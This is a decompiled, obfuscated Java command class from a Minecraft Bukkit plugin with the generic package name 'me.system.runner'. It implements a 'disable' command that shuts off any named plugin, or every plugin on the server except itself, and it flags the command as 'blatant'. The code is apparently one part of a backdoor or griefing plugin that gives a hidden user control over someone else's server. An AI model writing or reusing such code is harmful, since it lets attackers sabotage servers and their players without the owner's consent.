/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.methods.API;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class DisableCommand
extends Command {
    public DisableCommand() {
        DisableCommand llllllllllllllIIIllIIIIIlIIIllll;
    }

    @Override
    public void execute(Core llllllllllllllIIIllIIIIIlIIIIlIl, String llllllllllllllIIIllIIIIIlIIIIlII, String[] llllllllllllllIIIllIIIIIlIIIIIll, Player llllllllllllllIIIllIIIIIIlllllll) {
        if (llllllllllllllIIIllIIIIIlIIIIIll.length <= 1) {
            llllllllllllllIIIllIIIIIIlllllll.sendMessage(Settings.USAGE("disable <plugin>"));
        } else if (llllllllllllllIIIllIIIIIlIIIIIll[1].equals("*")) {
            for (Plugin llllllllllllllIIIllIIIIIlIIIIlll : Bukkit.getServer().getPluginManager().getPlugins()) {
                if (llllllllllllllIIIllIIIIIlIIIIlll.getName().equals(llllllllllllllIIIllIIIIIlIIIIlIl.getDescription().getName())) continue;
                API.disablePlugin(llllllllllllllIIIllIIIIIlIIIIlll.getName());
            }
            llllllllllllllIIIllIIIIIIlllllll.sendMessage(Settings.PREFIX("You disabled all of the plugins on the server!"));
        } else if (Bukkit.getPluginManager().getPlugin(llllllllllllllIIIllIIIIIlIIIIIll[1]) == null) {
            llllllllllllllIIIllIIIIIIlllllll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append(llllllllllllllIIIllIIIIIlIIIIIll[1]).append(" doesn't exist. (Cap Sensitive)"))));
        } else if (Bukkit.getPluginManager().getPlugin(llllllllllllllIIIllIIIIIlIIIIIll[1]).isEnabled()) {
            API.disablePlugin(llllllllllllllIIIllIIIIIlIIIIIll[1]);
            llllllllllllllIIIllIIIIIIlllllll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append(Settings.RED).append(llllllllllllllIIIllIIIIIlIIIIIll[1]).append(Settings.WHITE).append(" is now disabled"))));
        } else {
            llllllllllllllIIIllIIIIIIlllllll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append(llllllllllllllIIIllIIIIIlIIIIIll[1]).append(" is already disabled!"))));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

